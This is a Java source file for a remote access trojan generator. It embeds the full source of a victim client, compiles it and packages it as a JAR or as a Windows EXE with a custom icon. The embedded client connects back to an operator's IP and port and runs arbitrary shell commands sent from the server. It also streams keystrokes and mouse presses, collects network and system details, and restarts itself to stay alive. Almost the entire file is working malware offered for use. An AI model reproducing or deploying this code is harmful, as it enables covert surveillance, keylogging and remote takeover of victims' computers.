package araratproject;

import java.io.File;
import java.io.FilenameFilter;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import org.apache.commons.io.FileUtils;

public class RatGenerator {

    private static String getSourceCode(String ip, int port) {
        return "import java.io.BufferedReader;\n"
                + "import java.io.File;\n"
                + "import java.io.IOException;\n"
                + "import java.io.InputStreamReader;\n"
                + "import java.io.PrintWriter;\n"
                + "import java.net.InetAddress;\n"
                + "import java.net.Socket;\n"
                + "import java.net.URISyntaxException;\n"
                + "import java.net.UnknownHostException;\n"
                + "import java.util.StringTokenizer;\n"
                + "import java.util.logging.Level;\n"
                + "import java.util.logging.Logger;\n"
                + "import org.jnativehook.GlobalScreen;\n"
                + "import org.jnativehook.NativeHookException;\n"
                + "import org.jnativehook.keyboard.NativeKeyEvent;\n"
                + "import org.jnativehook.keyboard.NativeKeyListener;\n"
                + "import org.jnativehook.mouse.NativeMouseEvent;\n"
                + "import org.jnativehook.mouse.NativeMouseListener;\n"
                + "import org.jnativehook.mouse.NativeMouseMotionListener;\n"
                + "\n"
                + "public class AraratProjectVictim {\n"
                + "\n"
                + "    private Socket socket;\n"
                + "    private TCPReceiver receiver;\n"
                + "    private TCPTransmitter transmitter;\n"
                + "    private KeyLogger keylogger;\n"
                + "    private InformationExtractor infoExtractor;\n"
                + "    private String serverIP, identification;\n"
                + "    private int port;\n"
                + "    private boolean isActive;\n"
                + "    private Timer timer;\n"
                + "\n"
                + "    AraratProjectVictim(String serverIP, int port) {\n"
                + "        this.serverIP = serverIP;\n"
                + "        this.port = port;\n"
                + "\n"
                + "        try {\n"
                + "            infoExtractor = new InformationExtractor();\n"
                + "            identification = infoExtractor.getIdentification();\n"
                + "        } catch (IOException | InterruptedException ex) {\n"
                + "            restart();\n"
                + "        }\n"
                + "\n"
                + "        connect();\n"
                + "    }\n"
                + "\n"
                + "    public void connect() {\n"
                + "        try {\n"
                + "            socket = new Socket(serverIP, port);\n"
                + "            //setting TCP transmitter/receiver\n"
                + "            receiver = new TCPReceiver(new BufferedReader(new InputStreamReader(socket.getInputStream())));\n"
                + "            receiver.start();\n"
                + "            transmitter = new TCPTransmitter(new PrintWriter(socket.getOutputStream(), true));\n"
                + "\n"
                + "            isActive = true;\n"
                + "\n"
                + "            timer = new Timer();\n"
                + "            timer.start();\n"
                + "\n"
                + "            keylogger = new KeyLogger();\n"
                + "\n"
                + "        } catch (IOException ex) {\n"
                + "            restart();\n"
                + "        }\n"
                + "    }\n"
                + "\n"
                + "    public void disconnect() {\n"
                + "        transmitter.sendString(\"DSCNT\");\n"
                + "    }\n"
                + "\n"
                + "    public void execute(String[] commands) throws IOException, InterruptedException {\n"
                + "        ProcessBuilder pb = new ProcessBuilder(commands);\n"
                + "        final Process p = pb.start();\n"
                + "\n"
                + "        // then start a thread to read the output.\n"
                + "        new Thread(new Runnable() {\n"
                + "            public void run() {\n"
                + "                BufferedReader output = new BufferedReader(\n"
                + "                        new InputStreamReader(p.getInputStream()));\n"
                + "\n"
                + "                try {\n"
                + "                    while ((output.readLine()) != null);\n"
                + "                } catch (IOException ex) {\n"
                + "                    restart();\n"
                + "                }\n"
                + "            }\n"
                + "        }).start();\n"
                + "    }\n"
                + "\n"
                + "    public void restart() {\n"
                + "        try {\n"
                + "            if (transmitter != null) {\n"
                + "                transmitter.sendString(\"RSTRT\");\n"
                + "            }\n"
                + "            final String javaBin = \"\\\"\" + System.getProperty(\"java.home\") + File.separator + \"bin\" + File.separator + \"java\\\"\";\n"
                + "            File currentJar = null;\n"
                + "\n"
                + "            currentJar = new File(AraratProjectVictim.class.getProtectionDomain().getCodeSource().getLocation().toURI());\n"
                + "\n"
                + "            /* is it a jar file? */\n"
                + "            if (!currentJar.getPath().endsWith(\".jar\")) {\n"
                + "                return;\n"
                + "            }\n"
                + "            /* Build command: java -jar application.jar */\n"
                + "            String[] command = {javaBin, \"-jar\", \"\\\"\" + currentJar.getPath() + \"\\\"\"};\n"
                + "\n"
                + "            execute(command);\n"
                + "        } catch (IOException | InterruptedException | URISyntaxException ex) {\n"
                + "            restart();\n"
                + "        }\n"
                + "\n"
                + "        System.exit(0);\n"
                + "    }\n"
                + "\n"
                + "    private class DataProcessor {\n"
                + "\n"
                + "        String data;\n"
                + "        String identifier = \"\";\n"
                + "        String information = \"\";\n"
                + "\n"
                + "        DataProcessor(String data) {\n"
                + "\n"
                + "            if (data != null && data.length() >= 5) {\n"
                + "                this.data = data;\n"
                + "                identifier = data.substring(0, 5);\n"
                + "                information = data.substring(5, data.length());\n"
                + "            }\n"
                + "        }\n"
                + "\n"
                + "        public void process() throws IOException, InterruptedException {\n"
                + "            if (data == null) {\n"
                + "                return;\n"
                + "            }\n"
                + "\n"
                + "            CommandProcessor cmp;\n"
                + "\n"
                + "            switch (identifier) {\n"
                + "\n"
                + "                case \"IDNTF\":\n"
                + "                    transmitter.sendString(identification);\n"
                + "\n"
                + "                    break;\n"
                + "\n"
                + "                case \"SINFO\":\n"
                + "\n"
                + "                    cmp = new CommandProcessor(\"systeminfo\", true, \"SINFO\");\n"
                + "                    cmp.start();\n"
                + "                    break;\n"
                + "\n"
                + "                case \"TRMNL\":\n"
                + "\n"
                + "                    cmp = new CommandProcessor(information, true, \"TRMNL\");\n"
                + "                    cmp.start();\n"
                + "                    break;\n"
                + "\n"
                + "                case \"DSCNT\":\n"
                + "                    socket.close();\n"
                + "                    System.exit(0);\n"
                + "                    break;\n"
                + "\n"
                + "                case \"RSTRT\":\n"
                + "                    try {\n"
                + "                        restart();\n"
                + "                    } catch (Exception ex) {\n"
                + "                        restart();\n"
                + "                    }\n"
                + "                    break;\n"
                + "            }\n"
                + "        }\n"
                + "\n"
                + "    }\n"
                + "\n"
                + "    private class TCPReceiver extends Thread {\n"
                + "\n"
                + "        private BufferedReader br;\n"
                + "        private String data = \"NULL\";\n"
                + "\n"
                + "        TCPReceiver(BufferedReader br) {\n"
                + "            this.br = br;\n"
                + "        }\n"
                + "\n"
                + "        public void run() {\n"
                + "            DataProcessor processor;\n"
                + "            while (true) {\n"
                + "                try {\n"
                + "                    data = br.readLine();\n"
                + "                    processor = new DataProcessor(data);\n"
                + "                    processor.process();\n"
                + "\n"
                + "                } catch (IOException ex) {\n"
                + "                    restart();\n"
                + "                } catch (InterruptedException ex) {\n"
                + "                    restart();\n"
                + "                }\n"
                + "            }\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        public void setData(String data) {\n"
                + "            this.data = data;\n"
                + "        }\n"
                + "\n"
                + "        public String getData() {\n"
                + "            return data;\n"
                + "        }\n"
                + "    }\n"
                + "\n"
                + "    private class TCPTransmitter {\n"
                + "\n"
                + "        private PrintWriter pr;\n"
                + "\n"
                + "        TCPTransmitter(PrintWriter pr) {\n"
                + "            this.pr = pr;\n"
                + "        }\n"
                + "\n"
                + "        public void sendString(String msg) {\n"
                + "            pr.println(msg);\n"
                + "        }\n"
                + "\n"
                + "    }\n"
                + "\n"
                + "    private class KeyLogger implements NativeKeyListener, NativeMouseListener, NativeMouseMotionListener {\n"
                + "\n"
                + "        KeyLogger() {\n"
                + "\n"
                + "            // Get the logger for \"org.jnativehook\" and set the level to warning.\n"
                + "            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());\n"
                + "            logger.setLevel(Level.WARNING);\n"
                + "\n"
                + "            // Don't forget to disable the parent handlers.\n"
                + "            logger.setUseParentHandlers(false);\n"
                + "\n"
                + "            try {\n"
                + "                GlobalScreen.registerNativeHook();\n"
                + "                GlobalScreen.addNativeKeyListener(this);\n"
                + "                GlobalScreen.addNativeMouseListener(this);\n"
                + "                GlobalScreen.addNativeMouseMotionListener(this);\n"
                + "            } catch (NativeHookException ex) {\n"
                + "                restart();\n"
                + "            }\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeKeyTyped(NativeKeyEvent nke) {\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeKeyPressed(NativeKeyEvent nke) {\n"
                + "            transmitter.sendString(\"KEYPR\" + nke.getKeyCode());\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeKeyReleased(NativeKeyEvent nke) {\n"
                + "            transmitter.sendString(\"KEYRE\" + nke.getKeyCode());\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeMouseClicked(NativeMouseEvent nme) {\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeMousePressed(NativeMouseEvent nme) {\n"
                + "            transmitter.sendString(\"MSEPR\" + nme.getButton());\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeMouseReleased(NativeMouseEvent nme) {\n"
                + "            transmitter.sendString(\"MSERE\" + nme.getButton());\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeMouseMoved(NativeMouseEvent nme) {\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        @Override\n"
                + "        public void nativeMouseDragged(NativeMouseEvent nme) {\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "    }\n"
                + "\n"
                + "    private class Timer extends Thread {\n"
                + "\n"
                + "        private boolean start;\n"
                + "\n"
                + "        public Timer() {\n"
                + "            start = true;\n"
                + "        }\n"
                + "\n"
                + "        public void run() {\n"
                + "            while (isActive) {\n"
                + "                if (start) {\n"
                + "                    try {\n"
                + "                        Thread.sleep(2000);\n"
                + "                        transmitter.sendString(\"ACTVE\");\n"
                + "\n"
                + "                    } catch (InterruptedException ex) {\n"
                + "                        restart();\n"
                + "                    }\n"
                + "                }\n"
                + "            }\n"
                + "        }\n"
                + "\n"
                + "        public void stopTimer() {\n"
                + "            start = false;\n"
                + "        }\n"
                + "\n"
                + "        public void startTimer() {\n"
                + "            start = true;\n"
                + "        }\n"
                + "\n"
                + "    }\n"
                + "\n"
                + "    private class InformationExtractor {\n"
                + "\n"
                + "        public InformationExtractor() throws IOException, InterruptedException {\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        private String findGatewayIPv4() throws IOException, InterruptedException {\n"
                + "            CommandProcessor prc = new CommandProcessor(\"ipconfig | findstr \\\"Default Gateway\\\" \");\n"
                + "            prc.start();\n"
                + "            String gateway = extractIPv4(prc.getData());\n"
                + "            if (isValidIPv4(gateway)) {\n"
                + "                return gateway;\n"
                + "            }\n"
                + "            return null;\n"
                + "        }\n"
                + "\n"
                + "        private String findGatewayIPv6() throws IOException, InterruptedException {\n"
                + "            CommandProcessor prc = new CommandProcessor(\"ipconfig | findstr \\\"Default Gateway\\\" \");\n"
                + "            prc.start();\n"
                + "            String ip, output = prc.getData();\n"
                + "            \n"
                + "            int index = output.indexOf(\"fe80\");\n"
                + "            if(index != -1 && output.indexOf(\"\\n\") != -1){\n"
                + "                ip = output.substring(index, output.indexOf(\"\\n\"));                \n"
                + "            }\n"
                + "            return null;\n"
                + "        }\n"
                + "\n"
                + "        private String findPrivateIP() throws IOException, InterruptedException {\n"
                + "            CommandProcessor prc = new CommandProcessor(\"ipconfig\");\n"
                + "            prc.start();\n"
                + "\n"
                + "            String data = prc.getData();\n"
                + "            String gateway = findGatewayIPv4();\n"
                + "            if(gateway == null){\n"
                + "                gateway = findGatewayIPv6();\n"
                + "            }   \n"
                + "\n"
                + "            boolean found = false;\n"
                + "            String privateIp = \"\";\n"
                + "            int ipv4Index = data.indexOf(\"IPv4\");\n"
                + "            int gatewayIndex = data.indexOf(\"Default Gateway\");\n"
                + "\n"
                + "            while (!found && ipv4Index != -1 && gatewayIndex != -1) {\n"
                + "\n"
                + "                String privateIpLine = data.substring(ipv4Index, data.indexOf(\"\\n\", ipv4Index));\n"
                + "                privateIp = extractIPv4(privateIpLine);\n"
                + "\n"
                + "                String gatewayLine = data.substring(gatewayIndex, data.indexOf(\"\\n\", gatewayIndex));\n"
                + "                String gatewayIp = extractIPv4(gatewayLine);\n"
                + "\n"
                + "                if (gatewayIp.equals(gateway)) {\n"
                + "                    found = true;\n"
                + "\n"
                + "                } else {\n"
                + "                    ipv4Index = data.indexOf(\"IPv4\", ipv4Index + privateIpLine.length());\n"
                + "                    gatewayIndex = data.indexOf(\"Default Gateway\", gatewayIndex + gatewayLine.length());\n"
                + "                }\n"
                + "\n"
                + "            }\n"
                + "\n"
                + "            if (!found || !isPrivateIPv4(privateIp)) {\n"
                + "                return null;\n"
                + "            }\n"
                + "\n"
                + "            return privateIp;\n"
                + "        }\n"
                + "\n"
                + "        private String findSubnetMask() throws IOException, InterruptedException {\n"
                + "            CommandProcessor prc = new CommandProcessor(\"ipconfig\");\n"
                + "            prc.start();\n"
                + "\n"
                + "            String data = prc.getData();\n"
                + "            String gateway = findGatewayIPv4();\n"
                + "\n"
                + "            boolean found = false;\n"
                + "            String subnetmask = \"\";\n"
                + "\n"
                + "            int subnetmaskIndex = data.indexOf(\"Subnet Mask\");\n"
                + "            int gatewayIndex = data.indexOf(\"Default Gateway\");\n"
                + "\n"
                + "            while (!found && subnetmaskIndex != -1 && gatewayIndex != -1) {\n"
                + "\n"
                + "                String subnetmaskLine = data.substring(subnetmaskIndex, data.indexOf(\"\\n\", subnetmaskIndex));\n"
                + "                subnetmask = extractIPv4(subnetmaskLine);\n"
                + "\n"
                + "                String gatewayLine = data.substring(gatewayIndex, data.indexOf(\"\\n\", gatewayIndex));\n"
                + "                String gatewayIp = extractIPv4(gatewayLine);\n"
                + "\n"
                + "                if (gatewayIp.equals(gateway)) {\n"
                + "                    found = true;\n"
                + "\n"
                + "                } else {\n"
                + "                    subnetmaskIndex = data.indexOf(\"Subnet Mask\", subnetmaskIndex + subnetmaskLine.length());\n"
                + "                    gatewayIndex = data.indexOf(\"Default Gateway\", gatewayIndex + gatewayLine.length());\n"
                + "                }\n"
                + "\n"
                + "            }\n"
                + "            return subnetmask;\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        private String findHostname() throws UnknownHostException {\n"
                + "            InetAddress thisIp = InetAddress.getLocalHost();\n"
                + "            String hostname = thisIp.getCanonicalHostName();\n"
                + "            return hostname;\n"
                + "        }\n"
                + "\n"
                + "        private String findOS() {\n"
                + "            return System.getProperty(\"os.name\");\n"
                + "        }\n"
                + "\n"
                + "        private boolean isPrivateIPv4(String IP) {\n"
                + "\n"
                + "            if (!isValidIPv4(IP)) {\n"
                + "                return false;\n"
                + "            }\n"
                + "            String[] octets = IP.split(\"\\\\.\");\n"
                + "\n"
                + "            return octets[0].equals(\"10\")\n"
                + "                    || (octets[0].equals(\"172\") && Integer.parseInt(octets[1]) >= 16 && Integer.parseInt(octets[1]) < 32)\n"
                + "                    || (octets[0].equals(\"192\") && octets[1].equals(\"168\"))\n"
                + "                    || (octets[0].equals(\"100\") && Integer.parseInt(octets[1]) >= 64 && Integer.parseInt(octets[1]) < 128);\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        private String extractIPv4(String data) {\n"
                + "            String ip = \"\";\n"
                + "            int ipIndex = 0;\n"
                + "            int octet = 0;\n"
                + "            for (int i = 0; i < data.length(); i++) {\n"
                + "                ipIndex = data.indexOf(\".\", ipIndex);\n"
                + "                if (ipIndex == -1) {\n"
                + "                    break;\n"
                + "                }\n"
                + "\n"
                + "                if (i > ipIndex) {\n"
                + "                    ipIndex = i;\n"
                + "                }\n"
                + "                if (isInteger(data.substring(i, ipIndex))) {\n"
                + "                    ip += data.substring(i, ipIndex) + \".\";\n"
                + "                    i = ipIndex++;\n"
                + "                    octet++;\n"
                + "                    if (octet == 3) {\n"
                + "                        while (ipIndex < data.length() && isInteger(\"\" + data.charAt(ipIndex))) {\n"
                + "                            ip += data.charAt(ipIndex);\n"
                + "                            ipIndex++;\n"
                + "                        }\n"
                + "                        break;\n"
                + "                    }\n"
                + "                }\n"
                + "\n"
                + "            }\n"
                + "            return ip;\n"
                + "        }\n"
                + "\n"
                + "        private boolean isInteger(String str) {\n"
                + "            if (str == null || str.isEmpty()) {\n"
                + "                return false;\n"
                + "            }\n"
                + "            str.trim();\n"
                + "            for (int i = 0; i < str.length(); i++) {\n"
                + "                if (str.charAt(i) == '-') {\n"
                + "                    if (str.length() == 1) {\n"
                + "                        return false;\n"
                + "                    }\n"
                + "                    continue;\n"
                + "                }\n"
                + "                if (!Character.isDigit(str.charAt(i))) {\n"
                + "                    return false;\n"
                + "                }\n"
                + "            }\n"
                + "            return true;\n"
                + "        }\n"
                + "\n"
                + "        private boolean isValidIPv4(String IP) {\n"
                + "\n"
                + "            IP = IP.trim();\n"
                + "            if (IP == null) {\n"
                + "                return false;\n"
                + "            }\n"
                + "            StringTokenizer octets = new StringTokenizer(IP, \".\");\n"
                + "\n"
                + "            if (octets.countTokens() != 4) {\n"
                + "                return false;\n"
                + "            } else {\n"
                + "                while (octets.hasMoreTokens()) {\n"
                + "                    String token = (String) octets.nextToken(\".\");\n"
                + "                    if (!isInteger(token)) {\n"
                + "                        return false;\n"
                + "                    } else if (Integer.parseInt(token) > 255) {\n"
                + "                        return false;\n"
                + "                    }\n"
                + "                }\n"
                + "            }\n"
                + "            return true;\n"
                + "        }\n"
                + "\n"
                + "        public String getIdentification() {\n"
                + "            try {\n"
                + "                return \"IDNTF\" + findPrivateIP() + \".-.-.\" + findSubnetMask() + \".-.-.\" + findGatewayIPv4() + \".-.-.\" + findHostname() + \".-.-.\" + findOS();\n"
                + "            } catch (IOException | InterruptedException ex) {\n"
                + "                restart();\n"
                + "            }\n"
                + "            return null;\n"
                + "        }\n"
                + "\n"
                + "        public String getSystemInfo() throws IOException, InterruptedException {\n"
                + "            CommandProcessor prc = new CommandProcessor(\"systeminfo\");\n"
                + "            prc.start();\n"
                + "            return prc.getData();\n"
                + "        }\n"
                + "\n"
                + "    }\n"
                + "\n"
                + "    private class CommandProcessor extends Thread {\n"
                + "\n"
                + "        private String command;\n"
                + "        private Process process;\n"
                + "        private BufferedReader ProcessIN;\n"
                + "        private String ResultLine;\n"
                + "        private String data = \"\", identifier;\n"
                + "        private boolean isRunning = true, liveTransfer;\n"
                + "\n"
                + "        private CommandProcessor(String command) throws IOException {\n"
                + "            this(command, false, null);\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        private CommandProcessor(String command, String identifier) throws IOException {\n"
                + "            this(command, false, identifier);\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        private CommandProcessor(String command, boolean liveTransfer, String identifier) throws IOException {\n"
                + "            this.command = command;\n"
                + "            this.liveTransfer = liveTransfer;\n"
                + "            this.identifier = identifier;\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        public void run() {\n"
                + "\n"
                + "            isRunning = true;\n"
                + "            try {\n"
                + "                process = Runtime.getRuntime().exec(\"cmd /c \" + command);\n"
                + "            } catch (IOException ex) {\n"
                + "                restart();\n"
                + "            }\n"
                + "            ProcessIN = new BufferedReader(new InputStreamReader(process.getInputStream()));\n"
                + "            data = \"\";\n"
                + "            try {\n"
                + "                ResultLine = ProcessIN.readLine();\n"
                + "                while (ResultLine != null) {\n"
                + "\n"
                + "                    if (identifier != null) {\n"
                + "                        ResultLine = identifier + ResultLine;\n"
                + "                    }\n"
                + "                    if (liveTransfer) {\n"
                + "                        transmitter.sendString(ResultLine);\n"
                + "                    }\n"
                + "\n"
                + "                    data += ResultLine + \"\\n\";\n"
                + "                    ResultLine = ProcessIN.readLine();\n"
                + "\n"
                + "                }\n"
                + "\n"
                + "            } catch (IOException ex) {\n"
                + "                restart();\n"
                + "            }\n"
                + "            isRunning = false;\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "        public boolean isRunning() {\n"
                + "            return isRunning;\n"
                + "        }\n"
                + "\n"
                + "        public String getData() throws InterruptedException {\n"
                + "\n"
                + "            while (isRunning) {\n"
                + "                Thread.sleep(10);\n"
                + "            }\n"
                + "            Thread.sleep(100);\n"
                + "            return data;\n"
                + "\n"
                + "        }\n"
                + "\n"
                + "    }\n"
                + "    public static void main(String[] args) {\n"
                + "        String ip = \"" + ip + "\";\n"
                + "        int port = " + port + ";\n"
                + "        new AraratProjectVictim(ip, port);\n"
                + "    }\n"
                + "\n"
                + "}\n"
                + "";
    }

    private static String getManifestCode() {
        return "Manifest-Version: 1.0\n"
                + "Main-Class: AraratProjectVictim\n";
    }

    private static String getConfigCode(String jarPath, String exePath, String iconPath) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<launch4jConfig>\n"
                + "  <dontWrapJar>false</dontWrapJar>\n"
                + "  <headerType>gui</headerType>\n"
                + "  <jar>" + jarPath + "</jar>\n"
                + "  <outfile>" + exePath + "</outfile>\n"
                + "  <errTitle></errTitle>\n"
                + "  <cmdLine></cmdLine>\n"
                + "  <chdir>.</chdir>\n"
                + "  <priority>normal</priority>\n"
                + "  <downloadUrl>http://java.com/download</downloadUrl>\n"
                + "  <supportUrl></supportUrl>\n"
                + "  <stayAlive>false</stayAlive>\n"
                + "  <restartOnCrash>true</restartOnCrash>\n"
                + "  <manifest></manifest>\n"
                + "  <icon>" + iconPath + "</icon>\n"
                + "  <jre>\n"
                + "    <path></path>\n"
                + "    <bundledJre64Bit>false</bundledJre64Bit>\n"
                + "    <bundledJreAsFallback>false</bundledJreAsFallback>\n"
                + "    <minVersion>1.8.0</minVersion>\n"
                + "    <maxVersion></maxVersion>\n"
                + "    <jdkPreference>preferJre</jdkPreference>\n"
                + "    <runtimeBits>32/64</runtimeBits>\n"
                + "  </jre>\n"
                + "</launch4jConfig>";
    }

    public static File saveRatAsJar(String path, boolean bundleJRE, boolean finalize) throws Exception {

        File source = null, manifest = null, lib = null, javaTools = null, tempF = null;
        File[] classes = null;
        try {
            if (!path.endsWith(".jar")) {
                path += ".jar";
            }

            File testFile = new File(path);
            testFile.createNewFile();
            testFile.delete();
        } catch (Exception ex) {
            new File(path).delete();
            throw new InvalidInputException("Directory \"" + new File(path).getParent() + "\" is not Read/Write accessible.\n Specify a different directory or give it R/W access.");
        }
        String tempFile = new File(path).getParent() + "\\temp";
        tempF = new File(tempFile);
        tempF.mkdirs();

        //set hidden attribute
        Files.setAttribute(tempF.toPath(), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);

        try {
            if (!finalize) {
                path = new File(path).getParent() + "\\temp\\" + new File(path).getName();
            }

            String directory = System.getProperty("user.dir");

            if (!new File(directory).canRead()) {
                throw new InvalidInputException("Server directory \"" + directory + "\" is not accessible.\n Change the server's directory or give read access to the current.");
            }

            javaTools = new File(directory + "\\Java Tools");
            File jar = new File(javaTools.getPath() + "\\bin\\jar.exe");
            File javac = new File(javaTools.getPath() + "\\bin\\javac.exe");

            if (!jar.exists() || !javac.exists()) {
                throw new InvalidInputException("\\Java tools is missing from the running directory.\n Please try again or reinstall the program.");
            }

            //Creating the source file 
            Server.genFrame.setStatus(" Generating source file...");
            Server.genFrame.setProgressBar(10);

            source = new File(tempFile + "\\AraratProjectVictim.java");
            Toolset.clearFile(source);
            Toolset.appendFile(source, getSourceCode(Server.ip, Server.listener.getPort()));
            if (!source.exists()) {
                throw new InvalidInputException("Source code not found. Please try again.");
            }

            //Creating the manifest
            Server.genFrame.setStatus(" Creating manifest file...");
            Server.genFrame.setProgressBar(20);

            manifest = new File(tempFile + "\\MANIFEST.mf");
            Toolset.clearFile(manifest);
            Toolset.appendFile(manifest, getManifestCode());
            if (!manifest.exists()) {
                throw new InvalidInputException("Manifest not found. Please try again.");
            }

            Server.genFrame.setStatus(" Loading dependencies...");
            Server.genFrame.setProgressBar(30);

            lib = new File(directory + "\\org");

            if (!lib.exists()) {
                throw new InvalidInputException("\\org is missing from the program's directory. Please try again.");
            }

            long initialSize = FileUtils.sizeOfDirectory(lib);
            FileUtils.copyDirectory(lib, new File(tempFile + "\\org"));
            long finalSize = FileUtils.sizeOfDirectory(new File(tempFile + "\\org"));
            int cnt = 0;
            while (finalSize < initialSize) {
                Thread.sleep(1000);
                cnt++;
                if (cnt > 10) {
                    throw new InvalidInputException("Dependencies failed to load succesfully");
                }
                finalSize = FileUtils.sizeOfDirectory(new File(tempFile + "\\org"));
            }

            Thread.sleep(2000);
            if (!new File(tempFile + "\\org").exists()) {
                throw new InvalidInputException("Dependencies failed to load succesfully");
            }

            //Compiling the source code
            Server.genFrame.setStatus(" Compiling...");
            Server.genFrame.setProgressBar(40);

            String compileCode[] = {"\"" + javac.getPath() + "\"", "\"" + tempFile + "\\AraratProjectVictim.java\""};
            Toolset.execute(compileCode, null);

            int counter = 0;
            do {
                classes = tempF.listFiles(new FilenameFilter() {

                    @Override
                    public boolean accept(File dir, String name) {
                        return (name.endsWith(".class"));
                    }

                });
                Thread.sleep(200);
                counter++;
                if (counter >= 5) {
                    throw new InvalidInputException("JAR compilation failed. Please Try again.");
                }
            } while (classes == null || classes != null && classes.length < 9);

            String package1[] = {"\"" + jar.getPath() + "\"", "-cvfm", "\"" + path + "\"", "MANIFEST.mf", "*.class", "org"};
            Toolset.execute(package1, tempFile);

            Server.genFrame.setStatus(" Exporting JAR file...");
            Server.genFrame.setProgressBar(70);

            String package2[] = {"\"" + jar.getPath() + "\"", "-cvfe", "\"" + path + "\"", "AraratProjectVictim", "*.class", "org"};
            Toolset.execute(package2, tempFile);

            counter = 0;
            while (!new File(path).exists()) {
                //Adding some delay
                Thread.sleep(200);
                counter++;
                if (counter >= 5) {
                    throw new InvalidInputException("JAR packaging failed. Please Try again.");
                }
            }

        } catch (Exception ex) {
            Server.genFrame.setStatus("");
            Server.genFrame.setProgressBar(0);
            throw new Exception(ex.getMessage());
        } finally {
            if (finalize) {
                //deleting temp file
                FileUtils.deleteDirectory(tempF);

                Server.genFrame.setStatus("");
                Server.genFrame.setProgressBar(100);
                Server.genFrame.setProgressBar(0);
            }

        }
        return new File(path);
    }

    public static void saveRatAsExe(String path, String iconPath, boolean bundleJRE) throws Exception {

        String jarPath = null, exePath = null;
        File config = null, launch4j = null, tempFile = null;
        try {
            //Command running directory
            String directory = System.getProperty("user.dir");

            if (!path.endsWith(".exe")) {
                exePath = path + ".exe";
                jarPath = path + "temp.jar";
            } else {
                exePath = path;
                jarPath = path.substring(0, path.length() - 4) + "temp.jar";
            }

            File jarFile = saveRatAsJar(jarPath, bundleJRE, false);

            //Creating the temp folder
            tempFile = new File(jarFile.getParent());

            Files.setAttribute(tempFile.toPath(), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);

            //creating config file
            Server.genFrame.setStatus(" Creating configuration file...");
            Server.genFrame.setProgressBar(80);
            config = new File(tempFile + "\\config.xml");
            Toolset.clearFile(config);
            Toolset.appendFile(config, getConfigCode(jarFile.getPath(), exePath, iconPath));
            if (!config.exists()) {
                throw new InvalidInputException("Config file not found. Please try again.");
            }

            launch4j = new File(directory + "\\Launch4j");

            int counter = 0;
            while (!launch4j.exists()) {
                //Adding some delay
                Thread.sleep(200);
                counter++;
                if (counter >= 4) {
                    throw new InvalidInputException("\\Launch4j is missing from the running directory. Please try again or reinstall the program.");
                }
            }

            Server.genFrame.setStatus(" Exporting EXE file...");
            Server.genFrame.setProgressBar(90);

            String createExeCommand[] = {"\"" + launch4j.getPath() + "\\launch4j.exe\"", "\"" + config.getPath() + "\""};
            Toolset.execute(createExeCommand, null);

            counter = 0;
            while (!new File(exePath).exists()) {
                //Adding some delay
                Thread.sleep(500);
                counter++;
                if (counter >= 5) {
                    throw new InvalidInputException("EXE packaging failed. Please Try again.");
                }
            }

        } catch (Exception ex) {
            throw new Exception(ex.getMessage());
        } finally {
            Server.genFrame.setStatus("");
            Server.genFrame.setProgressBar(100);
            Server.genFrame.setProgressBar(0);
            //deleting temp files
            FileUtils.deleteDirectory(tempFile);

        }
    }

}
